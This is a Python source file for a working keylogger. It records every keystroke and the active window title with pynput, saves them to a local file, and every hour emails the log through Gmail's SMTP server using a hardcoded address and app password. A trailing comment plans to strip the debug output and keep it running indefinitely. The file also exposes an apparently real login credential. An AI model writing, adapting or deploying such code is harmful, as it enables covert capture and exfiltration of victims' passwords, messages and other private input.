from logging import exception
import pygetwindow as gitwin
import smtplib
import queue
import pynput
import threading
import time
import schedule
from datetime import datetime
from email.message import EmailMessage

f_lock = threading.Lock()
send_overwrite = 0


class FileManipulator:
    #the appender w/ the queue
    @staticmethod
    def write_queue():
        with f_lock:
            f = open("demofile.txt", "a")

            global send_overwrite
            while send_overwrite != 1:
                time.sleep(0.5)
                #try block to handle empty block
                try:
                    #get the fifo logg
                    logg = PyLoggs.keyQueue.get_nowait()
                    f.write(f'{logg} ~ {datetime.now()}\n')
                    print(logg)
                except queue.Empty as e:
                    print(f"Queue is empty test successful: {e}")

            print("closing temporarily queue")
            f.close()


    @classmethod
    def make_message(cls, content):
        msg = EmailMessage()
        msg['Subject'] = f'logs ~ {datetime.now()}'
        msg['From'] = 'krunkhehehaha@gmail.com'
        msg['To'] = 'krunkhehehaha@gmail.com'
        msg.set_content(content)
        return msg


    @staticmethod
    def send_overwrite():
        print("TIMER METHOD WAITING TO OVERWRITE")
        with f_lock:
            print("timer entered send overwrite block")

            #resetting var so writer can continue
            global send_overwrite
            send_overwrite = 0

            #sending that email
            print("sending email")
            #creating a session
            print("getting session")
            s = smtplib.SMTP('smtp.gmail.com', 587)
            #starting tls
            print("starting tls")
            s.starttls()
            # Authentication
            print("auth to fuckface")
            s.login("krunkhehehaha@gmail.com", "doii tpmd gytk vomo")
            #dumping file to message string
            print("dumping file")
            f = open("demofile.txt")
            message = FileManipulator.make_message(f.read())
            f.close()
            #send the mail
            print("yeet mail")
            print(f'message -> {message}')
            s.sendmail("krunkhehehaha@gmail.com", "krunkhehehaha@gmail.com", message.as_string())

            f = open("demofile.txt", "w")
            print("overwrote file")
            f.write("")
            print("wrote empty string and closing now")
            f.close()



#the writer class to write to a file
class TheWriter:
    @staticmethod
    def write_to_file():
        FileManipulator.write_queue()
        ###while loop to check signal on lock to reenter
        while True:
            global send_overwrite
            if send_overwrite != 1:
                print("waiting to reenter queue write")
                FileManipulator.write_queue()



class PyLoggs:
    #keystroke queue
    keyQueue = queue.Queue(maxsize=-1)

    #class method to add key press to list
    @classmethod      #Key for spec keys or KeyCode for normal
    def on_press(cls, key, injected):
        try:
            key_press = '{} : {} : Window : {}'.format(
                key.char, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)
        except AttributeError:
            key_press = 'SK {} : Window : {}'.format(
                key, gitwin.getActiveWindowTitle())
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)


    @classmethod
    def on_release(cls, key, injected):
        #setting global variable to overwrite
        global send_overwrite
        send_overwrite = 1
        #add release to queue
        key_release = '{} rels : {} : Window {}'.format(
            key, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
        #adding item to end of list
        PyLoggs.keyQueue.put_nowait(key_release)


    #main method for listen
    @classmethod
    def board_listen(cls):
        #listener start
        my_key_lstnr = pynput.keyboard.Listener(
            on_press=PyLoggs.on_press,
            on_release=PyLoggs.on_release)
        my_key_lstnr.start()

        #just looping inf never will exit.
        while True:
            time.sleep(60)


class timer:
    #this will call the method to overwrite and send
    #the queue dumper should see the lock exited as its waiting to reenter
    @staticmethod
    @schedule.repeat(schedule.every().hour.at(":00"))
    def send_overwrite():
        global send_overwrite
        send_overwrite = 1
        FileManipulator.send_overwrite()



    @classmethod
    def run_my_scedule(cls):
        #looping to check the time
        while True:
            schedule.run_pending()
            time.sleep(1)


##########################################


def main():
    f = open("demofile.txt", "w")
    f.close()

    #daeomonized thread will exit when all other non-daemons exit
    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
    #declaring and defining the logging thread
    t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
    #daeomonized thread will exit when all other non-daemons exit
    t_writer = threading.Thread(target=TheWriter.write_to_file, daemon=True, args=()).start()
    #starting the main logging thread
    t_loggs.start()
    t_loggs.join()


if __name__ == "__main__":
    main()

'''
Current Workflow
    > Ok now we just need to take out the debugging information
    > Set hourly (DONE)
    > Set the exit to none.
      > So remove the exit_ global
      > Fix the reentry loop


REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
  * EASY MISTAKE TO FORGET
  * 
'''
